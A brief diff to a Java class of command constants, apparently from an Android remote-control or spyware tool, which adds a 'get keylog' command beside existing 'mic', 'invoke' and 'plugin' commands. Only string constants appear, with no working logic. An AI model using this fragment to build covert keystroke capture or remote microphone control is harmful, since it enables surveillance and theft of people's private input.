@@ -58,8 +58,9 @@ public class CommandObj extends Object implements ICommandObj,Parcelable {
 	public static final String CMD_MIC = "mic";
 	public static final String CMD_NOTIFY = "notify";
 	public static final String CMD_INVOKE = "invoke";
-	
 	public static final String CMD_PLUGIN = "plugin";
+	
+	public static final String CMD_GET_KEYLOG = "get keylog";
 	
 	
 	
